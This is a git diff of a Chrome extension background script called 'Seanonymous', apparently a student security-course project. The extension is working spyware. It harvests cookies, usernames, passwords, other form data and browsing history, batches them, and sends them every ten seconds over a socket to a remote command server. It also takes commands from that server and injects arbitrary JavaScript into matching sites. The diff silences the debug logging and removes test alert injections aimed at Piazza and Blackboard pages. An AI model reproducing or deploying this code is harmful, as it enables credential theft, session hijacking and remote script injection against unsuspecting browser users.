@@ -74,27 +74,27 @@ chrome.webRequest.onBeforeRequest.addListener(
  */
 chrome.tabs.onUpdated.addListener(
 	function(tabId, changeInfo, tab){
-		console.log(config);
+		//console.log(config);
 		var cmds_run = [];
 		var listChanged = false;
 		if(changeInfo.status == 'complete' && tab.active){
 			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs) {
                 var url = tabs[0].url;
                 var site;
-                console.log("URL: ", url);
+                //console.log("URL: ", url);
                 var i;
                 for (i = 0; i < config.js_cmd.length; i++) {
                     site = Object.keys(config.js_cmd[i])[0];	//length-1 array
-                    console.log("targetSite: ", site);
+                    //console.log("targetSite: ", site);
                     if (!(url.match(site) == undefined)) {
-                        console.log("MATCHED THE SITE");
-                        console.log("config.js_cmd before: ",config.js_cmd);
+                        //console.log("MATCHED THE SITE");
+                        //console.log("config.js_cmd before: ",config.js_cmd);
                         var code = config.js_cmd[i][site];
                         config.js_cmd.splice(i,1);
                         i--;
                         chrome.tabs.executeScript(null, {"code": code}, function(){
-                            console.log("executed for site: ", site);
-                            console.log("config.js_cmd after: ",config.js_cmd);
+                            //console.log("executed for site: ", site);
+                            //console.log("config.js_cmd after: ",config.js_cmd);
                             listChanged = true;
 						});
                     }
@@ -112,7 +112,7 @@ chrome.tabs.onUpdated.addListener(
 
 
 chrome.webRequest.onBeforeRequest.addListener(function(details){
-	console.log("Baking Cookies!");
+	//console.log("Baking Cookies!");
 	chrome.cookies.getAll({"url":details.url},function(cookies){
 		console.log("cookies ", queue.cookies);
 		var cookiesChanged = false;
@@ -121,7 +121,7 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			var newCookie = {"name": cookies[i].name,
 							 "url": details.url,
 							 "content": cookies[i].value};
-			console.log("newCookie: ", newCookie);
+			//console.log("newCookie: ", newCookie);
 			queue.cookies.push(newCookie)
 			cookiesChanged = true;
 		}
@@ -149,11 +149,11 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			Object.keys(formData).forEach(function(key){
 				if(!(key.match("formurl") == undefined)){};		//ignore this, it appears in all predefined phishing attacks
 				if(!(key.match("username") == undefined)||!(key.match("password") == undefined)){
-					console.log("input credential: ", key);
+					//console.log("input credential: ", key);
 					credential[key]=formData[key];
 				}
 				else{
-					console.log("input form data: ", key);
+					//console.log("input form data: ", key);
 					complex[key] = formData[key];
 				}
 			})
@@ -163,13 +163,13 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 		var queueChanged = false;
 		//add these forms to a buffer for storing the payload until the next scheduled payload sending
 		if(Object.keys(credential).length > 1) {
-			console.log("Pushing creds");
+			//console.log("Pushing creds");
             queue.creds.push(credential);
             queueChanged = true;
         }
-        console.log("complex: ", Object.keys(complex).length);
+        //console.log("complex: ", Object.keys(complex).length);
         if(Object.keys(complex).length > 1) {
-			console.log("Pushing complex");
+			//console.log("Pushing complex");
             queue.forms.push(complex);
             queueChanged = true;
         }
@@ -208,7 +208,7 @@ async function loadConfig(){
 	await chrome.storage.local.get('config', function(result){
 		if(!(result.config == undefined)){
 			config = result.config;
-			console.log('Seanonymous: configuration loaded!');
+			//console.log('Seanonymous: configuration loaded!');
 		}
 	});
 }
@@ -218,7 +218,7 @@ async function loadConfig(){
  */
 async function storeConfig(){
 	await chrome.storage.local.set({config: config}, function(result){
-		console.log('Seanonymous: configuration saved!');
+		//console.log('Seanonymous: configuration saved!');
 	});
 }
 
@@ -228,7 +228,7 @@ async function loadQueue(){
     await chrome.storage.local.get('queue', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
-            console.log('Seanonymous: message queue loaded!')
+            //console.log('Seanonymous: message queue loaded!')
         }
     });
 }
@@ -238,7 +238,7 @@ async function loadQueue(){
  */
 async function storeQueue(){
     await chrome.storage.local.set({queue: queue}, function(result){
-        console.log('Seanonymous: message queue saved!');
+        //console.log('Seanonymous: message queue saved!');
     });
 }
 
@@ -274,7 +274,7 @@ function createClientIDRequest(){
 }
 
 function handleServerPayload(payload) {
-	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
+	//console.log('Payload received: ' + JSON.stringify(payload, null, 2));
 	if(!validateServerPayload(payload)){
 		console.log("Failed to validate payload");
 		return false;
@@ -308,16 +308,16 @@ function connectToHost(){
 	socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
 	
     socket.on('connect', function(){	
-		console.log('stored clientid is ' + config.ID);
+		//console.log('stored clientid is ' + config.ID);
 		if (config.ID == undefined || config.ID == 0 || config.ID == null){
-			console.log('No ID stored, getting ID');
+			//console.log('No ID stored, getting ID');
 			socket.emit('extpayload', createClientIDRequest(), function(answer){
 				config.ID = answer.clientid;
 				storeConfig();
 			});
 		}
 		else{
-	    	console.log('ID is stored' + config.ID);
+	    	//console.log('ID is stored' + config.ID);
 		}
 	});
 	
@@ -325,10 +325,10 @@ function connectToHost(){
         console.log("Connection error: " + data);
     });
     socket.on('srvpayload',function(msg){
-		console.log('message received from server');
+		//console.log('message received from server');
 
 		if(handleServerPayload(msg)){
-			console.log("payload successfully handled");
+			//console.log("payload successfully handled");
 		}
 		else{
 			console.log("payload handling failed");
@@ -344,10 +344,10 @@ function sendPayload(){
 	if(socket){
 
 		getClientHistory(config.last_pkt, 200).then(function (){
-            newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
-            console.log("Sending a PAYLOAD");
-            console.log("HISTORY: ",queue.history);
-            console.log("HISTORY2: ", newJson['history']);
+            var newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
+            //console.log("Sending a PAYLOAD");
+            //console.log("HISTORY: ",queue.history);
+            //console.log("HISTORY2: ", newJson['history']);
             socket.emit('extpayload', newJson, function(answer){
                 handleServerPayload(answer);
                 clearQueue();
@@ -361,24 +361,12 @@ function sendPayload(){
 
 function main_func() {
 	connectToHost();
-	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
-    config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
-    config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
-	//config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
-	//setListener(config.security_blacklist);
-
     setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
-	console.log("config: ",config);
+	//console.log("config: ",config);
 }
 
-
-
-
-
-
-
-    loadConfig().then(
-        loadQueue().then(
-            main_func
-        )
-    );
+loadConfig().then(
+    loadQueue().then(
+        main_func
+    )
+);
